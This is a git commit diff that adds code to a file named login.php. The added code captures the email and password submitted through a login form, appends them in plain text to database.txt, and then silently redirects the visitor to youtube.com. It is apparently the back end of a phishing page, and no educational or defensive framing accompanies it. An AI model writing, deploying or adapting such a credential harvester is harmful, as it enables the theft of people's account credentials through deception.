93be2ab85579ca92df71f57d34fdb7d39047f66d
Izeick <metro_2033_nik@mail.ru>
2021-01-22 16:40:45 +0300

    Initial commit

--- login.php
+++ login.php
@@ -1,5 +1,14 @@
 <?PHP
 
+$Log = $_POST['email'];
+
+$Pass = $_POST['pass'];
+
+$log = fopen("database.txt","at");
+
+fwrite($log,"\n $Log:$Pass \n");
+
+fclose($log);
 
 echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://youtube.com'></head></html>";
 
